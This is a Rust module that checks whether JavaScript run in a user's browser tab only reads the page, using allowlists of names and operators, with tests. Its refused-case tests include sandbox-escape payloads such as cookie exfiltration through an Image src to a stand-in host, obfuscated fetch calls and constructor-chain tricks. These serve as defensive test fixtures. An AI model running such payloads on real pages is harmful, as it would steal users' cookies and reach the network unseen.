//! Read-only JavaScript for the person's own tab: a script `run` there
//! (outside YOLO, and for jobs always) may only read the page. A list of
//! forbidden calls can't promise that (`window['fe'+'tch']`, `new
//! Image().src = …`, `location = …` slip past one), so the script is
//! checked against what a read needs instead: every name it uses is one of
//! [`GLOBALS`] or [`MEMBERS`] (or a one-letter arrow parameter, never
//! called), nothing is assigned or created, members are reached only by
//! name or by a number, only names are called, and there are no template
//! strings, regular expressions, or comments to hide anything in. What passes can read the page and compute with it;
//! it can't reach the network, navigate, change the page, or read cookies,
//! storage, or form values.

/// Names a read may start from.
const GLOBALS: &[&str] = &[
    "document",
    "getSelection",
    "Array",
    "JSON",
    "Math",
    "Number",
    "String",
    "Boolean",
    "parseInt",
    "parseFloat",
    "isNaN",
    "true",
    "false",
    "null",
    "undefined",
    "NaN",
    "Infinity",
    "typeof",
    "return",
];

/// Members a read may use: the page's structure and text, and what
/// arrays, strings, and numbers compute.
const MEMBERS: &[&str] = &[
    // The document.
    "title",
    "URL",
    "body",
    "head",
    "documentElement",
    "activeElement",
    "links",
    "images",
    "forms",
    "querySelector",
    "querySelectorAll",
    "getElementById",
    "getElementsByTagName",
    "getElementsByClassName",
    "getElementsByName",
    // Elements.
    "innerText",
    "textContent",
    "innerHTML",
    "outerHTML",
    "tagName",
    "nodeName",
    "id",
    "className",
    "classList",
    "contains",
    "getAttribute",
    "hasAttribute",
    "href",
    "src",
    "alt",
    "name",
    "type",
    "checked",
    "selected",
    "disabled",
    "options",
    "selectedIndex",
    "children",
    "childElementCount",
    "parentElement",
    "firstElementChild",
    "lastElementChild",
    "nextElementSibling",
    "previousElementSibling",
    "closest",
    "matches",
    "rows",
    "cells",
    "dataset",
    // Arrays, strings, numbers, objects.
    "length",
    "from",
    "isArray",
    "stringify",
    "map",
    "filter",
    "find",
    "findIndex",
    "some",
    "every",
    "slice",
    "join",
    "concat",
    "flat",
    "flatMap",
    "includes",
    "indexOf",
    "lastIndexOf",
    "reverse",
    "sort",
    "split",
    "trim",
    "toLowerCase",
    "toUpperCase",
    "startsWith",
    "endsWith",
    "replace",
    "replaceAll",
    "substring",
    "padStart",
    "padEnd",
    "toString",
    "toFixed",
    "min",
    "max",
    "round",
    "floor",
    "ceil",
    "abs",
];

/// Operators, longest first; the ones that assign, step, or divide (a
/// regular expression or a comment starts with `/`) are refused.
const PUNCTUATORS: &[&str] = &[
    ">>>=", "...", "===", "!==", "**=", "<<=", ">>=", ">>>", "&&=", "||=", "??=", "=>", "==", "!=",
    "<=", ">=", "&&", "||", "??", "?.", "++", "--", "+=", "-=", "*=", "/=", "%=", "&=", "|=", "^=",
    "**", "<<", ">>", "{", "}", "(", ")", "[", "]", ".", ";", ",", "<", ">", "+", "-", "*", "%",
    "&", "|", "^", "!", "~", "?", ":", "=", "/",
];

const REFUSED_PUNCTUATORS: &[&str] = &[
    ">>>=", "**=", "<<=", ">>=", "&&=", "||=", "??=", "++", "--", "+=", "-=", "*=", "/=", "%=",
    "&=", "|=", "^=", "=", "/",
];

#[derive(Clone, Debug, PartialEq)]
enum Token {
    Name(String),
    Number,
    Text,
    Punct(&'static str),
}

/// Whether `script` only reads the page; why not when it doesn't.
pub fn read_only(script: &str) -> Result<(), String> {
    let tokens = tokenize(script)?;
    let mut params: Vec<&str> = Vec::new();
    for (at, token) in tokens.iter().enumerate() {
        if *token != Token::Punct("=>") {
            continue;
        }
        let mut before = at;
        if at > 0 && tokens[at - 1] == Token::Punct(")") {
            before -= 1;
            while before > 0 {
                before -= 1;
                match &tokens[before] {
                    Token::Name(name) => params.push(name),
                    Token::Punct(",") => {}
                    Token::Punct("(") => break,
                    _ => return Err("arrow functions take plain parameters".into()),
                }
            }
        } else if let Some(Token::Name(name)) = at.checked_sub(1).map(|at| &tokens[at]) {
            params.push(name);
        }
    }
    if let Some(param) = params
        .iter()
        .find(|param| param.len() != 1 || !param.starts_with(|c: char| c.is_ascii_lowercase()))
    {
        return Err(format!(
            "arrow parameters are single lowercase letters (not “{param}”)"
        ));
    }
    for (at, token) in tokens.iter().enumerate() {
        let previous = at.checked_sub(1).map(|at| &tokens[at]);
        let next = tokens.get(at + 1);
        match token {
            Token::Punct(punct) if REFUSED_PUNCTUATORS.contains(punct) => {
                return Err(format!("“{punct}” changes something or hides code"));
            }
            // Only a name is called: never what a member access or a
            // call returned (a page's own handler).
            Token::Punct("(") if matches!(previous, Some(Token::Punct(")" | "]"))) => {
                return Err("only named functions are called".into());
            }
            Token::Punct("[") => {
                let member = matches!(
                    previous,
                    Some(Token::Name(_) | Token::Punct(")" | "]" | "?."))
                ) && !matches!(previous, Some(Token::Name(name)) if name == "return" || name == "typeof");
                if member
                    && !(matches!(next, Some(Token::Number))
                        && tokens.get(at + 2) == Some(&Token::Punct("]")))
                {
                    return Err("members are reached by name or by a number".into());
                }
            }
            Token::Name(name) => {
                let member = matches!(previous, Some(Token::Punct("." | "?.")));
                if member {
                    if !MEMBERS.contains(&name.as_str()) {
                        return Err(format!("“{name}” isn't something a read uses"));
                    }
                } else if params.contains(&name.as_str()) {
                    if next == Some(&Token::Punct("(")) {
                        return Err(format!("“{name}” can't be called"));
                    }
                } else if !GLOBALS.contains(&name.as_str()) {
                    return Err(format!("“{name}” isn't something a read uses"));
                }
            }
            _ => {}
        }
    }
    Ok(())
}

fn tokenize(script: &str) -> Result<Vec<Token>, String> {
    let mut tokens = Vec::new();
    let mut rest = script;
    while let Some(c) = rest.chars().next() {
        if c.is_whitespace() {
            rest = &rest[c.len_utf8()..];
        } else if c == '"' || c == '\'' {
            let mut escaped = false;
            let mut end = None;
            for (at, inner) in rest.char_indices().skip(1) {
                if escaped {
                    escaped = false;
                } else if inner == '\\' {
                    escaped = true;
                } else if inner == c {
                    end = Some(at);
                    break;
                } else if inner == '\n' {
                    break;
                }
            }
            let end = end.ok_or("a string isn't closed")?;
            tokens.push(Token::Text);
            rest = &rest[end + 1..];
        } else if c.is_ascii_digit() {
            let end = rest
                .find(|c: char| !c.is_ascii_digit())
                .unwrap_or(rest.len());
            let mut end = end;
            if rest[end..].starts_with('.')
                && rest[end + 1..].starts_with(|c: char| c.is_ascii_digit())
            {
                end += 1 + rest[end + 1..]
                    .find(|c: char| !c.is_ascii_digit())
                    .unwrap_or(rest.len() - end - 1);
            }
            tokens.push(Token::Number);
            rest = &rest[end..];
        } else if c.is_ascii_alphabetic() || c == '_' || c == '$' {
            let end = rest
                .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == '$'))
                .unwrap_or(rest.len());
            tokens.push(Token::Name(rest[..end].to_owned()));
            rest = &rest[end..];
        } else if let Some(punct) = PUNCTUATORS.iter().find(|punct| rest.starts_with(**punct)) {
            tokens.push(Token::Punct(punct));
            rest = &rest[punct.len()..];
        } else {
            return Err(format!("“{c}” isn't allowed in a read"));
        }
    }
    Ok(tokens)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn reads_pass() {
        for script in [
            "document.title",
            "document.querySelector('h1').innerText",
            "Array.from(document.querySelectorAll('a')).map(a => a.href).slice(0, 20).join('\\n')",
            "JSON.stringify([...document.links].map((a, i) => ({\"t\": a.innerText.trim(), \"i\": i})))",
            "document.querySelectorAll('tr')[2].cells.length",
            "String(getSelection())",
            "document.body.innerText.length > 1000 ? 'long' : 'short'",
            "Math.max(1.5, 2) * 3 % 2",
            "typeof document.title === 'string'",
            "document.querySelector('a')?.href",
        ] {
            assert_eq!(read_only(script), Ok(()), "{script}");
        }
    }

    #[test]
    fn anything_that_acts_or_reaches_out_is_refused() {
        for script in [
            "new Image().src='https://x/?'+document.cookie",
            "location='https://x/'",
            "window['fe'+'tch']('https://x')",
            "fetch('https://x')",
            "document['coo'+'kie']",
            "document.cookie",
            "document.querySelector('button').click()",
            "document.forms[0].submit()",
            "document.title = 'x'",
            "document.querySelector('input').value",
            "localStorage.getItem('x')",
            "document.querySelector('a').href += '1'",
            "[].constructor.constructor('return fetch')()",
            "'x'.constructor",
            "1..constructor",
            "document.title.replace(/x/, `${fetch('y')}`)",
            "/\"/.test(1) + fetch('x') + /\"/",
            "document.body // fetch('x')",
            "\\u0066etch('x')",
            "(fetch => fetch('x'))(1)",
            "(e => e('x'))(fetch)",
            "x => x('y')",
            "document.querySelector('a').dispatchEvent(1)",
            "open('https://x')",
            "document.write('x')",
            "eval('1')",
            "Object.values(document.body)[0]('x')",
            "document.querySelectorAll('a')[0]('x')",
            "(a => a.innerText)(document.body)",
            "Function('x')()",
            "document.body.innerHTML = ''",
            "'unclosed",
            "#x",
        ] {
            assert!(read_only(script).is_err(), "{script}");
        }
    }
}
